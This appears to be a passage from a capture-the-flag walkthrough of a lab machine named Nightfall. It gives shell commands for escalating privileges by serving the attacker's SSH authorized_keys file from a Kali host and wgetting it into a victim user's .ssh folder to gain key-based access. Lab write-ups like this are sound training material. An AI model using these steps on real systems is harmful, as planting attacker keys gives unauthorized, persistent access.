4.4 Getting root shell



From the previous step we're on “matt#nightfall” shell.

a) Apply the previous approach of placing blank passphrase ssh key. Copy "authorized_keys" file to “/var/www/html” folder to have access to it. So on your Kali Machine type the following commands.

$ cd /root/.ssh/
$ ls
$ cp authorized_keys /var/www/html/


b) Get the "authorized_keys" file from your victim machine.

$ cd /home/nightfall
$ mkdir .ssh
$ cd .ssh
$ wget 192.168.12.28/authorized_keys
